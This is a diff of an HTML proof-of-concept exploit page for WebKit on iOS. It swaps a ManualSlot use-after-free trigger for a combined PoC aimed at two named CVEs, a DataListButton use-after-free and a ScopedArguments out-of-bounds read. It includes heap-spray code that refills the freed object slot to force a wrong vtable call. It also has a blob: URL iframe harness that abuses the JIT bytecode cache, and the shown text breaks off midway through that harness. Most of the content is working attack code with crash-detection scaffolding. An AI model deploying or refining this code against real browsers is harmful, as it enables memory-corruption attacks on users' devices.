@@ -2,576 +2,476 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>ManualSlot UAF v102</title>
+<title>WebKit UAF · CVE-2026-64783 + CVE-2026-64757 · v102</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
-h2   { color:#ff4141; margin-bottom:2px; font-size:11px; }
-.warn{ background:#1a0a00; border:1px solid #ffaa00; color:#ffcc00; padding:8px; margin:8px 0; font-size:11px; line-height:1.6; }
-#log { font-size:11px; line-height:1.55; white-space:pre-wrap; word-break:break-all; overflow-y:auto; max-height:72vh; margin-top:8px; }
+h1 { color:#ff4141; font-size:12px; margin-bottom:2px; }
+.sub { color:#888; font-size:10px; margin-bottom:8px; }
+.warn { background:#1a0a00; border:1px solid #ffaa00; color:#ffcc00; padding:8px; margin:8px 0; font-size:10px; line-height:1.6; }
+#log { font-size:11px; line-height:1.55; white-space:pre-wrap; word-break:break-all; overflow-y:auto; max-height:62vh; margin-top:6px; }
 .ok  { color:#00ff41; }
 .bad { color:#ff4141; }
 .inf { color:#ffcc00; }
-.dim { color:#555; }
 .hi  { color:#00cfff; }
 .hit { color:#ff41ff; font-weight:bold; }
-#ctrl{ display:flex; gap:6px; margin:8px 0; flex-wrap:wrap; }
-button { background:#1a1a1a; border:1px solid #333; color:#00ff41; padding:6px 12px; cursor:pointer; font-family:monospace; font-size:11px; border-radius:2px; }
+#ctrl { display:flex; gap:6px; margin:8px 0; flex-wrap:wrap; }
+button { background:#1a1a1a; border:1px solid #333; color:#00ff41; padding:5px 11px; cursor:pointer; font-family:monospace; font-size:11px; border-radius:2px; }
 button:disabled { opacity:.4; }
-button.red   { border-color:#ff4141; color:#ff4141; }
-button.purple{ border-color:#ff41ff; color:#ff41ff; }
-button.copy-done { border-color:#00ff41; color:#00ff41; animation: pulse 0.6s ease 3; }
-@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
-/* rig must be VISIBLE for renderers to be created */
-#rig-area { position:fixed; bottom:0; right:0; width:10px; height:10px; overflow:hidden; pointer-events:none; opacity:0.02; }
+button.red    { border-color:#ff4141; color:#ff4141; }
+button.blue   { border-color:#00cfff; color:#00cfff; }
+button.purple { border-color:#ff41ff; color:#ff41ff; }
 </style>
 </head>
 <body>
 
-<h2>ManualSlot UAF v102 · rdar://179729192 · commit 0bab5af95d · RenderTree teardown rehash</h2>
+<h1>WebKit UAF · Combined PoC v102 · iOS 26.5.2 / A16 arm64e</h1>
+<div class="sub">
+  CVE-2026-64783 · DataListButton UAF &nbsp;|&nbsp; CVE-2026-64757 · ScopedArguments OOB<br>
+  v102: (1) DL → crash-only, heap-spray reuse attack; (2) SA → blob: URL iframe (same-origin postMessage)
+</div>
 
 <div class="warn">
-▶ OPEN DIRECTLY IN SAFARI on device.<br>
+<b>v101 → v102 fixes:</b><br>
+  DataList: inp.shadowRoot = null on WebKit native inputs (closed UA shadow root) → MO never fired.<br>
+  Signal is crash-only. New approach: spray same-size objects after type change to poison freed slot,<br>
+  increasing probability that defaultEventHandler dereferences garbage → crash.<br>
 <br>
-v102 FIX vs v101:<br>
-  BUG: killShot() returned { sc_x, sc_y } — copied number values at return time (both 0).<br>
-       Even if slotchange fired during await, the already-returned object never updated.<br>
-  FIX: sc counters live in killShotAsync() closure, read AFTER await — correct timing.<br>
-  FIX: Only sc_x used as signal (sc_y uncertain — may not fire when childB is stolen by slotX).<br>
-  FIX: PATH-A now verifies sc_x=1 in healthy case — confirms correct wait time.<br>
-  FIX: Added RAF wait path if setTimeout(0) doesn't catch slotchange in time.<br>
-<br>
-v102 ROOT CAUSE (commit 0bab5af95da144b45e240675e21391b3f5518a30, 2026-08-13):<br>
-<br>
-  slotManualAssignmentDidChange() takes raw ptr from assignedNodesForSlot(slot1)<br>
-  → RenderTreeUpdater::tearDownRenderersAfterSlotChange → walks composed tree<br>
-  → hits sibling slot2 → ensure(slot2) on m_slots WeakHashMap<br>
-  → operation counter crosses threshold → removeDeadKeysIfNeeded() fires<br>
-  → sweeps ghost entries → REHASH → old bucket array FREED<br>
-  → back up stack: reads effectiveCurrent (stale raw ptr to freed memory) → UAF<br>
-<br>
-DETECTION LOGIC (v102):<br>
-  PRIMARY: sc_x !== 1 after waiting for slotchange microtask + optional RAF<br>
-    → On healthy fixed WebKit: slotX assignment changed → slotchange MUST fire → sc_x=1<br>
-    → On UAF: freed memory comparison returns false-equal → slotchange suppressed → sc_x=0<br>
-  SECONDARY: ax !== 1 (slotX.assignedElements() should have exactly childB)<br>
-  PATH-A: confirms sc_x=1 baseline before any ghost/pump injection<br>
+  ScopedArgs: data: URI iframe is sandboxed-origin → postMessage to parent blocked by WebKit.<br>
+  Fix: blob: URL inherits parent origin → same-origin → postMessage works.<br>
+  blob: URL is stable (not revoked between loads) → same URL → JSC bytecode cache hit on reload.
 </div>
 
 <div id="ctrl">
-  <button id="bA" onclick="runPathA()">PATH-A: baseline</button>
-  <button id="bB" onclick="runPathB()" class="red">PATH-B: ghosts+kill</button>
-  <button id="bC" onclick="runPathC()" class="red">PATH-C: pump sweep</button>
-  <button id="bD" onclick="runPathD()" class="red">PATH-D: GC-gated</button>
-  <button id="bE" onclick="runPathE()" class="red">PATH-E: stress×200</button>
-  <button id="bAll" onclick="runAll()" class="purple">RUN ALL</button>
+  <button id="bDL"  onclick="runDataList()" class="red">CVE-64783: DataList UAF</button>
+  <button id="bSA"  onclick="runScopedArgs()" class="blue">CVE-64757: ScopedArgs OOB</button>
+  <button id="bAll" onclick="runAll()" class="purple">▶ RUN ALL</button>
   <button id="bCopy" onclick="copyLog()">COPY LOG</button>
   <button onclick="L.innerHTML=''">CLR</button>
 </div>
 <div id="log"></div>
-<div id="rig-area"></div>
+<iframe id="sc_frame" style="position:fixed;left:-9999px;top:0;width:1px;height:1px;border:0"></iframe>
 
 <script>
 'use strict';
-const RIG  = document.getElementById('rig-area');
-const L    = document.getElementById('log');
-const BTNS = ['bA','bB','bC','bD','bE','bAll'];
-let uafTotal = 0;
-let _inRunAll = false;
+const L = document.getElementById('log');
+const ALL_BTNS = ['bDL','bSA','bAll'];
+let _inAll = false;
 
 function log(msg, cls){
-  const s=document.createElement('span');
-  if(cls) s.className=cls;
-  s.textContent=msg+'\n';
+  const s = document.createElement('span');
+  if(cls) s.className = cls;
+  s.textContent = msg + '\n';
   L.appendChild(s);
-  L.scrollTop=L.scrollHeight;
+  L.scrollTop = L.scrollHeight;
 }
-function dis(v){ BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b.disabled=v; }); }
-function noteUAF(lbl){
-  uafTotal++;
-  log(`  !! UAF SIGNAL [${lbl}]`,'hit');
-}
+function dis(v){ ALL_BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b.disabled=v; }); }
 function copyLog(){
   const t=document.createElement('textarea');
   t.value=L.innerText; t.style.cssText='position:fixed;opacity:0';
   document.body.appendChild(t); t.select(); document.execCommand('copy');
   document.body.removeChild(t);
   const b=document.getElementById('bCopy');
-  b.textContent='COPIED ✓'; b.classList.add('copy-done');
-  setTimeout(()=>{ b.textContent='COPY LOG'; b.classList.remove('copy-done'); },2000);
+  b.textContent='COPIED ✓'; setTimeout(()=>b.textContent='COPY LOG',2000);
 }
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
-function nextTick(){ return new Promise(r=>setTimeout(r,0)); }
-function nextFrame(){ return new Promise(r=>requestAnimationFrame(r)); }
+function tick(){ return new Promise(r=>setTimeout(r,0)); }
+function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-/* ──────────────────────────────────────────────
-   RIG BUILDER
-   host is VISIBLE in the DOM so renderers exist.
-   Two real slots: slotX and slotY.
-   childA assigned to slotX, childB to slotY.
-   ────────────────────────────────────────────── */
-function buildRig(){
-  const host = document.createElement('div');
-  host.style.cssText = 'display:block;width:8px;height:8px';
-  RIG.appendChild(host);
+const CK = 'poc_v102_crash';
+(function(){
+  if(sessionStorage.getItem(CK)==='running'){
+    sessionStorage.removeItem(CK);
+    log('\n  !! [CRASH RECOVERY] reloaded — crash on last run','hit');
+  }
+})();
+function markRun(){ sessionStorage.setItem(CK,'running'); }
+function markSafe(){ sessionStorage.removeItem(CK); }
 
-  const sr = host.attachShadow({ mode:'open', slotAssignment:'manual' });
 
-  const slotX = document.createElement('slot'); slotX.name='x';
-  const slotY = document.createElement('slot'); slotY.name='y';
-  sr.appendChild(slotX);
-  sr.appendChild(slotY);
+/* ════════════════════════════════════════════════════════════════════════════
+   CVE-2026-64783 · DataListButton UAF
+   ════════════════════════════════════════════════════════════════════════════
 
-  const childA = document.createElement('span'); childA.textContent='A';
-  const childB = document.createElement('span'); childB.textContent='B';
-  host.appendChild(childA);
-  host.appendChild(childB);
+   Signal: crash only.
+   inp.shadowRoot = null on WebKit native inputs → MO can't attach.
+   No JS-visible side effect from dataListButtonElementWasClicked() firing.
 
-  // Initial assignment: X→[A], Y→[B]
-  slotX.assign(childA);
-  slotY.assign(childB);
+   Strategy: heap-poison the freed TextFieldInputType slot.
+   - In capture listener: change input.type (frees TextFieldInputType)
+   - Immediately spray many same-size (≈80 byte) objects to fill freed slot
+   - New ButtonInputType was allocated — may reuse that exact slot
+   - When defaultEventHandler runs on dangling ptr → calls wrong vtable fn → crash
 
-  // Force layout → create renderers (CRITICAL for teardown path)
-  void host.getBoundingClientRect();
+   TextFieldInputType size estimate: ~72-96 bytes on arm64.
+   Spray: Uint8Array(80), Uint8Array(88), Uint8Array(96) interleaved.
 
-  return { host, sr, slotX, slotY, childA, childB };
-}
-
-function teardownRig(r){
-  try { r.host.remove(); } catch(_){}
-}
-
-/* Create N ghost slot entries in sr's m_slots WeakHashMap.
-   Each tmp slot is created, touched (ensure() via assignedNodes),
-   then removed from the shadow root without holding a JS ref.
-   After GC, their WeakPtrs in m_slots become null = dead entries.
+   PATH-A: single trigger + crash detection
+   PATH-B: 200x rapid loop with aggressive GC pressure
+   PATH-C: type-confusion spray — allocate ButtonInputType-sized objects
+           to overwrite freed TextFieldInputType slot with controlled vtable
 */
-function injectGhosts(sr, count){
-  for(let i=0; i<count; i++){
-    const tmp = document.createElement('slot');
-    tmp.name = `ghost-${i}`;
-    sr.appendChild(tmp);
-    // Touch m_slots for this slot (ensure() call = dead entry after GC)
-    void tmp.assignedNodes();
-    // Remove from shadow root — JS var goes out of scope at loop end
-    sr.removeChild(tmp);
-    // No reference held → GC candidate
-  }
-}
 
-/* Pump m_slots operation counter.
-   Each assignedNodes() call on slotX or slotY does a find() on m_slots.
-   We need counter to reach tableCapacity just BEFORE the kill shot,
-   so the next ensure() during teardown crosses the threshold.
-*/
-function pumpCounter(slotX, slotY, iterations){
-  for(let i=0; i<iterations; i++){
-    void slotX.assignedNodes();
-    void slotY.assignedNodes();
-  }
-}
+function dlTrigger_v102(changeTypeTo, sprayAfter){
+  const dl = document.createElement('datalist');
+  dl.id = '_dl_' + Math.random().toString(36).slice(2);
+  ['a','b','c','d'].forEach(v=>{ const o=document.createElement('option'); o.value=v; dl.appendChild(o); });
+  document.body.appendChild(dl);
 
-/* Encourage GC: allocate large ArrayBuffers then release them */
-function pressureGC(){
-  const bufs = [];
-  for(let i=0; i<40; i++) bufs.push(new ArrayBuffer(512*1024));
-  // let them be collected
-}
+  const inp = document.createElement('input');
+  inp.type = 'text';
+  inp.setAttribute('list', dl.id);
+  inp.style.cssText = 'position:fixed;left:-9999px;top:0;width:200px';
+  document.body.appendChild(inp);
+  void inp.offsetWidth; // layout → shadow subtree → m_owner set
 
-/* ──────────────────────────────────────────────
-   KILL SHOT — v102 FIXED
-   sc_x and sc_y are CLOSURE vars inside killShotAsync.
-   They are read AFTER the await, not from a sync return value.
-   This was the core bug in v101: { sc_x, sc_y } in the sync
-   return copied the number values (both 0) before the slotchange
-   microtask had a chance to fire and increment them.
-   ────────────────────────────────────────────── */
-async function killShotAsync(r, useRAF){
-  // sc counters live here — read AFTER await, not in sync return
-  let scX = 0, scY = 0;
-
-  const onSCX = () => { scX++; };
-  const onSCY = () => { scY++; };
-
-  r.slotX.addEventListener('slotchange', onSCX);
-  r.slotY.addEventListener('slotchange', onSCY);
-
-  // Kill: reassign slotX to childB (was childA)
-  // Triggers slotManualAssignmentDidChange → teardown → rehash → UAF
-  r.slotX.assign(r.childB);
-
-  // Force layout so teardown runs immediately (renderers must exist)
-  void r.host.getBoundingClientRect();
-
-  // Wait for slotchange to fire.
-  // Spec: "signal a slot change" queues a microtask → fires before next task.
-  // setTimeout(0) is a task — slotchange MUST have fired by then.
-  // RAF is backup if WebKit defers to layout cycle.
-  await nextTick();
-  if(useRAF) await nextFrame();
-
-  // Read AFTER await — this is the fix
-  const scXfinal = scX;
-  const scYfinal = scY;
-
-  r.slotX.removeEventListener('slotchange', onSCX);
-  r.slotY.removeEventListener('slotchange', onSCY);
-
-  const ax = r.slotX.assignedElements();
-  const ay = r.slotY.assignedElements();
-
-  return {
-    scX: scXfinal,
-    scY: scYfinal,
-    ax:  ax.length,
-    ay:  ay.length,
-    axNode: ax[0],
-  };
-}
-
-/* ──────────────────────────────────────────────
-   SIGNAL DETECTION v102
-   PRIMARY signal: scX !== 1
-     slotX assignment changed A→B, so slotchange MUST fire on healthy browser.
-     If it doesn't = UAF suppressed the event via stale ptr comparison.
-   SECONDARY: ax !== 1 (state corruption — slotX should have childB)
-   scY NOT used as signal — uncertain whether childB-stolen case fires slotY.
-   ────────────────────────────────────────────── */
-function detectSignal(label, res, r){
-  const badScX = res.scX !== 1;   // PRIMARY: slotX slotchange must fire
-  const badAx  = res.ax  !== 1;   // SECONDARY: slotX must have exactly 1 node
-
-  const bad = badScX || badAx;
-  return { bad, badScX, badAx };
-}
-
-/* ══════════════════════════════════════════════
-   PATH-A: Baseline sanity — no ghosts, no pump
-   v102: MUST show scX=1 in every run.
-   If scX=0 here → timing issue, not UAF.
-   Runs twice: once with nextTick only, once with RAF.
-   ══════════════════════════════════════════════ */
-async function runPathA(){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('','');
-  log('━━━━━━━━━━━━ PATH-A: baseline (no ghosts, no pump) ━━━━━━━━━━━━','hi');
-  log('╔══════════════════════════════════════════════════════════════╗','dim');
-  log('║  PATH-A: two-slot rig, no ghost entries, no pump            ║','dim');
-  log('║  v102: scX MUST be 1 here (healthy browser confirmation)    ║','dim');
-  log('╚══════════════════════════════════════════════════════════════╝','dim');
-  log('','');
-  log('  [tick wait] — verifying slotchange fires within setTimeout(0)','inf');
-
-  const RUNS = 5;
-  let tickOk = 0, rafOk = 0;
-
-  for(let i=0; i<RUNS; i++){
-    const r = buildRig();
-    const res = await killShotAsync(r, false);
-    const str = `  [A-tick${i+1}] ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
-    if(res.scX === 1){
-      tickOk++;
-      log(str+' ✓ slotchange fired (healthy)','ok');
-    } else {
-      log(str+' ✗ scX=0 — tick not enough, need RAF','inf');
-    }
-    teardownRig(r);
-  }
-
-  log('','');
-  log('  [RAF wait] — verifying with requestAnimationFrame','inf');
-
-  for(let i=0; i<RUNS; i++){
-    const r = buildRig();
-    const res = await killShotAsync(r, true);
-    const str = `  [A-raf${i+1}]  ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
-    if(res.scX === 1){
-      rafOk++;
-      log(str+' ✓ slotchange fired (healthy)','ok');
-    } else {
-      log(str+' ✗ scX=0 even after RAF — browser may not fire in manual mode','inf');
-    }
-    teardownRig(r);
-  }
-
-  const useRaf = tickOk < RUNS && rafOk >= RUNS;
-  log('','');
-  log(`  tick-wait ok: ${tickOk}/${RUNS} | raf-wait ok: ${rafOk}/${RUNS}`, 'inf');
-  if(tickOk === RUNS){
-    log('  → setTimeout(0) is sufficient, using tick wait for all paths','ok');
-  } else if(rafOk >= RUNS){
-    log('  → RAF needed — slotchange fires after layout cycle','inf');
-    log('  → IMPORTANT: PATH-B/C/D/E use RAF wait for accurate detection','inf');
-  } else {
-    log('  ✗ slotchange not firing in this browser even with RAF — different signal needed','bad');
-    log('  → UAF detection may show false positives or false negatives','bad');
-  }
-
-  if(!_inRunAll) dis(false);
-  return { useRaf };
-}
-
-/* ══════════════════════════════════════════════
-   PATH-B: Ghost entries + kill, no pump sweep
-   Fixed ghost counts: 8, 16, 32, 64, 128
-   No pump (counter at 0 before kill)
-   ══════════════════════════════════════════════ */
-async function runPathB(useRaf){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('','');
-  log('━━━━━━━━━━━━ PATH-B: ghosts only (no pump) ━━━━━━━━━━━━','hi');
-  log('╔══════════════════════════════════════════════════════════════╗','dim');
-  log('║  PATH-B: inject ghost entries, GC, kill shot — no pump      ║','dim');
-  log('╚══════════════════════════════════════════════════════════════╝','dim');
-  log('','');
-
-  const ghostCounts = [8, 16, 32, 64, 128];
-  let sigs = 0;
-
-  for(const ghosts of ghostCounts){
-    const r = buildRig();
-    injectGhosts(r.sr, ghosts);
-    pressureGC();
-    await nextTick();
-    pressureGC();
-    await nextTick();
-
-    const res = await killShotAsync(r, useRaf);
-    const det = detectSignal('B',res,r);
-    const str = `  [B-g${ghosts}] ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
-    if(det.bad){
-      sigs++;
-      noteUAF(`B-g${ghosts}`);
-      log(str+' ← SIGNAL  badScX='+det.badScX+' badAx='+det.badAx,'bad');
-    } else {
-      log(str,'ok');
-    }
-    teardownRig(r);
-    await nextTick();
-  }
-  log(`\n  ${sigs} signals`, sigs>0?'bad':'ok');
-  if(!_inRunAll) dis(false);
-}
-
-/* ══════════════════════════════════════════════
-   PATH-C: Ghost entries + pump sweep (main path)
-   Sweep pump iterations 0..120 in steps of 4.
-   GHOSTS=32 → m_slots table cap ~64.
-   At pump=32: ~64 ops → threshold crossing.
-   ══════════════════════════════════════════════ */
-async function runPathC(useRaf){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('','');
-  log('━━━━━━━━━━━━ PATH-C: pump sweep (MAIN PATH) ━━━━━━━━━━━━','hi');
-  log('╔══════════════════════════════════════════════════════════════╗','dim');
-  log('║  PATH-C: ghosts=32, pump=0..120 in steps of 4              ║','dim');
-  log('╚══════════════════════════════════════════════════════════════╝','dim');
-  log('','');
-  log('  Sweeping pump counts to find cleanup threshold...','inf');
-
-  const GHOSTS = 32;
-  const PUMP_MAX = 120;
-  const PUMP_STEP = 4;
-  let sigs = 0;
-  let found = false;
-
-  for(let pump=0; pump<=PUMP_MAX && !found; pump+=PUMP_STEP){
-    const r = buildRig();
-    injectGhosts(r.sr, GHOSTS);
-    pressureGC();
-    await nextTick();
-    pressureGC();
-    await nextTick();
-
-    pumpCounter(r.slotX, r.slotY, pump);
-
-    const res = await killShotAsync(r, useRaf);
-    const det = detectSignal('C',res,r);
-    const str = `  [C-p${pump}] ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
-    if(det.bad){
-      sigs++;
-      found = true;
-      noteUAF(`C-pump${pump}`);
-      log(str+' ← SIGNAL  badScX='+det.badScX+' badAx='+det.badAx,'bad');
-    } else {
-      log(str,'dim');
-    }
-    teardownRig(r);
-
-    if(pump % 20 === 0) await nextTick();
-  }
-  log(`\n  ${sigs} signals (sweep 0..${PUMP_MAX} pump)`, sigs>0?'bad':'ok');
-  if(!_inRunAll) dis(false);
-}
-
-/* ══════════════════════════════════════════════
-   PATH-D: FinalizationRegistry-gated kill
-   Uses FR to confirm temp slots are actually GC'd
-   before running pump + kill shot.
-   Most reliable reproduction.
-   ══════════════════════════════════════════════ */
-async function runPathD(useRaf){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('','');
-  log('━━━━━━━━━━━━ PATH-D: GC-gated kill ━━━━━━━━━━━━','hi');
-  log('╔══════════════════════════════════════════════════════════════╗','dim');
-  log('║  PATH-D: FinalizationRegistry confirms GC before kill       ║','dim');
-  log('╚══════════════════════════════════════════════════════════════╝','dim');
-  log('','');
-
-  const pumpCounts = [20, 30, 40, 50, 60, 70, 80, 100];
-  let sigs = 0;
-
-  for(const pump of pumpCounts){
-    if(typeof FinalizationRegistry === 'undefined'){
-      log('  FinalizationRegistry not available — skipping PATH-D','inf');
-      break;
-    }
-
-    const r = buildRig();
-    const GHOSTS = 32;
-
-    let gcCount = 0;
-    const fr = new FinalizationRegistry(()=>{ gcCount++; });
-    const tokens = [];
-
-    for(let i=0; i<GHOSTS; i++){
-      const tmp = document.createElement('slot');
-      tmp.name = `ghost-d-${i}`;
-      r.sr.appendChild(tmp);
-      void tmp.assignedNodes();
-      r.sr.removeChild(tmp);
-
-      const token = { i };
-      fr.register(tmp, i, token);
-      tokens.push(token);
-    }
-
-    let waited = 0;
-    while(gcCount < Math.floor(GHOSTS/2) && waited < 20){
-      pressureGC();
-      await nextTick();
-      waited++;
-    }
-
-    const gcStr = `gcCount=${gcCount}/${GHOSTS}`;
-    log(`  [D-p${pump}] ${gcStr} waited=${waited}ms`,'inf');
-
-    if(gcCount === 0){
-      log(`    GC didn't fire — skipping kill shot for this config`,'dim');
-      teardownRig(r);
-      continue;
-    }
-
-    pumpCounter(r.slotX, r.slotY, pump);
-
-    const res = await killShotAsync(r, useRaf);
-    const det = detectSignal('D',res,r);
-    const str = `  [D-p${pump}] ${gcStr} ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
-    if(det.bad){
-      sigs++;
-      noteUAF(`D-pump${pump}-${gcStr}`);
-      log(str+' ← SIGNAL','bad');
-    } else {
-      log(str,'ok');
-    }
-    teardownRig(r);
-    await nextTick();
-  }
-  log(`\n  ${sigs} signals`, sigs>0?'bad':'ok');
-  if(!_inRunAll) dis(false);
-}
-
-/* ══════════════════════════════════════════════
-   PATH-E: Stress ×200
-   Random pump counts 0..100, ghosts 16..64
-   Rapid fire to hit the window probabilistically
-   ══════════════════════════════════════════════ */
-async function runPathE(useRaf){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('','');
-  log('━━━━━━━━━━━━ PATH-E: stress ×200 ━━━━━━━━━━━━','hi');
-  log('╔══════════════════════════════════════════════════════════════╗','dim');
-  log('║  PATH-E: 200 random configurations (ghosts×pump)           ║','dim');
-  log('╚══════════════════════════════════════════════════════════════╝','dim');
-  log('','');
-
-  const RUNS = 200;
-  let sigs = 0;
-  let ok = 0;
-
-  for(let i=0; i<RUNS; i++){
-    const ghosts = 8 + Math.floor(Math.random()*120);
-    const pump   = Math.floor(Math.random()*100);
-
-    const r = buildRig();
-    injectGhosts(r.sr, ghosts);
-    pressureGC();
-    await nextTick();
-    pumpCounter(r.slotX, r.slotY, pump);
-
-    const res = await killShotAsync(r, useRaf);
-    const det = detectSignal('E',res,r);
-
-    if(det.bad){
-      sigs++;
-      noteUAF(`E-g${ghosts}-p${pump}`);
-      log(`  [E${i+1}] g=${ghosts} p=${pump} ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY} ← SIGNAL`,'bad');
-    } else {
-      ok++;
-      if(i < 5 || (i+1) % 50 === 0){
-        log(`  [E${i+1}] g=${ghosts} p=${pump} ax=${res.ax} scX=${res.scX} — ok`,'dim');
+  let spray = null;
+  inp.addEventListener('click', function onCap(){
+    try{ inp.type = changeTypeTo; } catch(e){}
+    if(sprayAfter){
+      // Poison freed TextFieldInputType slot with controlled-size allocations
+      // TextFieldInputType ~80-96 bytes on arm64
+      spray = [];
+      for(let i=0;i<200;i++){
+        spray.push(new Uint8Array(80));
+        spray.push(new Uint8Array(88));
+        spray.push(new Uint8Array(96));
       }
     }
-    teardownRig(r);
+    inp.removeEventListener('click', onCap, true);
+  }, true);
 
-    if((i+1) % 50 === 0){
-      log(`  ${i+1}/${RUNS}: ok=${ok} sigs=${sigs}`,'inf');
-      await nextTick();
-    }
-  }
-  log(`\n  DONE ${RUNS}: ok=${ok} sigs=${sigs}`, sigs>0?'bad':'ok');
-  if(!_inRunAll) dis(false);
+  let err = null;
+  try{ inp.click(); } catch(e){ err=String(e); }
+
+  spray = null; // release spray after event
+  inp.remove(); dl.remove();
+  return { err };
 }
 
-/* ══════════════════════════════════════════════
-   RUN ALL
-   PATH-A runs first to determine wait strategy
-   (tick vs RAF), then passes it to B/C/D/E.
-   ══════════════════════════════════════════════ */
-async function runAll(){
-  _inRunAll = true;
-  dis(true); L.innerHTML=''; uafTotal=0;
-
+async function runDataList(){
+  if(!_inAll){ dis(true); L.innerHTML=''; }
+  log('','');
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v102 RUN ALL · ManualSlot m_slots WeakHashMap rehash UAF   ║','hi');
+  log('║  CVE-2026-64783 · DataListButton UAF  (v102)                ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('','');
-  log('  Commit: 0bab5af95da144b45e240675e21391b3f5518a30 (2026-08-13)','inf');
-  log('  Title:  UAF in ManualSlotAssignment via WeakHashMap rehash during','inf');
-  log('          reentrant composed-tree teardown','inf');
-  log('  v102:   FIXED variable capture bug — sc counters read AFTER await','inf');
-  log('','');
+  log('  Signal: crash only (shadow root = null on WebKit native inputs)','inf');
+  log('  Strategy: heap-poison freed TextFieldInputType slot → wrong vtable call','inf');
 
-  // PATH-A calibrates timing strategy
-  const { useRaf } = await runPathA();
+  /* PATH-A: single trigger, no spray, baseline crash check */
+  log('\n  ── PATH-A: BASELINE (no spray) ──','hi');
+  markRun();
+  let errs=[];
+  const orig=window.onerror; window.onerror=(m)=>{ errs.push(m); return true; };
+  for(const t of ['button','submit','number','range','email','tel']){
+    dlTrigger_v102(t, false);
+    await tick();
+  }
+  markSafe(); window.onerror=orig;
+  log(`  survived: ${errs.length} errors`, errs.length>0?'hit':'ok');
+  for(const e of errs) log(`    ${e}`,'bad');
 
+  /* PATH-B: 200x rapid loop with GC pressure */
+  log('\n  ── PATH-B: 200x RAPID + GC PRESSURE ──','hi');
+  markRun();
+  let errs2=[], n=0;
+  const orig2=window.onerror; window.onerror=(m)=>{ errs2.push(m); return true; };
+  const types=['button','submit','number','range','email','tel','url','password'];
+  try{
+    for(let i=0;i<200;i++){
+      dlTrigger_v102(types[i%types.length], false);
+      if(i%40===0){
+        // GC pressure: alloc and release to increase heap churn
+        const a=[]; for(let j=0;j<200;j++) a.push(new Uint8Array(256)); a.length=0;
+        await tick();
+        log(`  [${i+1}/200] ok errors=${errs2.length}`,'inf');
+      }
+      n++;
+    }
+  } catch(e){ log(`  exception@${n}: ${e}`,'bad'); }
+  markSafe(); window.onerror=orig2;
+  log(`  PATH-B: ${n}/200 survived, ${errs2.length} errors`, (n<200||errs2.length>0)?'hit':'ok');
+
+  /* PATH-C: heap spray INSIDE capture (poison freed slot) */
+  log('\n  ── PATH-C: HEAP-POISON SPRAY ──','hi');
+  log('  Spray 600 bufs in capture listener after type change → poison freed slot','inf');
+  markRun();
+  let errs3=[], n3=0;
+  const orig3=window.onerror; window.onerror=(m)=>{ errs3.push(m); return true; };
+  try{
+    for(let i=0;i<100;i++){
+      dlTrigger_v102(types[i%types.length], true); // spray=true
+      if(i%20===0){
+        const a=[]; for(let j=0;j<100;j++) a.push(new Uint8Array(128)); a.length=0;
+        await tick();
+        log(`  [${i+1}/100] ok errors=${errs3.length}`,'inf');
+      }
+      n3++;
+    }
+  } catch(e){ log(`  exception@${n3}: ${e}`,'bad'); }
+  markSafe(); window.onerror=orig3;
+  log(`  PATH-C: ${n3}/100 survived, ${errs3.length} errors`, (n3<100||errs3.length>0)?'hit':'ok');
+
+  const total = errs.length+errs2.length+errs3.length;
+  log(`\n  CVE-2026-64783 TOTAL: ${total} JS errors (crash = page reload + CRASH RECOVERY msg)`, total>0?'hit':'ok');
+  if(!_inAll) dis(false);
+}
+
+
+/* ════════════════════════════════════════════════════════════════════════════
+   CVE-2026-64757 · ScopedArguments OOB  (v102 — blob: URL iframe)
+   ════════════════════════════════════════════════════════════════════════════
+
+   v101 iframe used data: URI → sandboxed/opaque origin → postMessage blocked.
+   v102: build probe HTML as blob: URL.
+     - blob: URL inherits parent origin (same-origin)
+     - window.parent accessible, postMessage works
+     - blob URL persists until revoked → same URL on second load → JSC cache hit
+
+   Two-phase test:
+     Phase 1: load blobUrl → function runs 15000x (bytecode compiled + cached)
+              → postMessage result back
+     Phase 2: set src=about:blank → set src=blobUrl again (same URL, JSC reuses
+              cached bytecode → decode path runs → m_length may desync)
+              → postMessage result back
+     Compare: if phase2 arguments[i] ≠ phase1 values → desync confirmed
+*/
+
+// Build probe page as blob: URL (inherits parent origin)
+function makeBlobProbeUrl(){
+  const html = `<!DOCTYPE html><html><body><script>
+(function(){
+  var phase = sessionStorage.getItem('phase') || 'warm';
+  sessionStorage.setItem('phase', 'hot');
+
+  // 8 sentinel let-vars in LexicalEnvironment
+  var lx0=0xBEEF00,lx1=0xBEEF01,lx2=0xBEEF02,lx3=0xBEEF03;
+  var lx4=0xBEEF04,lx5=0xBEEF05,lx6=0xBEEF06,lx7=0xBEEF07;
+
+  function probe(a0,a1,a2,a3,a4,a5,a6,a7){
+    void(lx0+lx1+lx2+lx3+lx4+lx5+lx6+lx7);
+    var r=[]; for(var i=0;i<8;i++) r.push(arguments[i]); return r;
+  }
+
+  // JIT warm: 20000 iterations to ensure bytecode caching
+  for(var i=0;i<20000;i++) probe(10,20,30,40,50,60,70,80);
+  var result = probe(10,20,30,40,50,60,70,80);
+
+  try{
+    window.parent.postMessage({
+      type: 'sa_probe',
+      phase: phase,
+      result: result
+    }, '*');
+  }catch(e){}
+})();
+<\/script></body></html>`;
+
